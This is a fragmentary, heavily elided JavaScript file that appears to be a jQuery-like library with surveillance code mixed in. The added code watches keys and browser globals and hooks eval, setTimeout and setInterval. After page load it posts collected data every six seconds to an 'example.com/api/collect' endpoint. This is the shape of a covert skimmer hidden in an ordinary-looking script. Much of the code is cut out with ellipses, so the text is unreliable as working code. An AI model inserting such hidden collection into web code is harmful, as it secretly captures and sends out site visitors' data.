...
(function (A, w) {
  ...
  let keysToWatch = window.trackKeys;
  function wa(a) {
  ...
  let globalVarsWatch = ['screen', 'navigator'];
  ...
  var eb = /Until$/,
    ...
    gb = /,/;
  R = Array.prototype.slice;
  let jshookWatch = ['eval', 'setTimeout', 'setInterval'];
  ...
  jshookWatch.forEach(hook => {
    let original = window[hook];
    window[hook] = function () {
      console.log(`Function ${hook} was called with arguments:`, arguments);
  ...
  function getHashCode(obj) {
    ...
    let hash = keys.reduce((hash, key) => Math.imul(31, hash) + key.charCodeAt(0) | 0, 17);
  ...
  async function uploadData(data) {
    ...
    let response = await fetch("https://example.com/api/collect", {
      method: "POST",
      headers: new Headers({
    ...
    if (response.ok) {
      console.log(`Data uploaded successfully with code: ${response.status}`);
    } else {
      console.log(`Error during upload: ${response.status}`);
    }
  }
  c.extend({
  ...
  document.addEventListener("DOMContentLoaded", function () {
    ...
    window.setInterval(collectAndUploadData, 6000);
  });
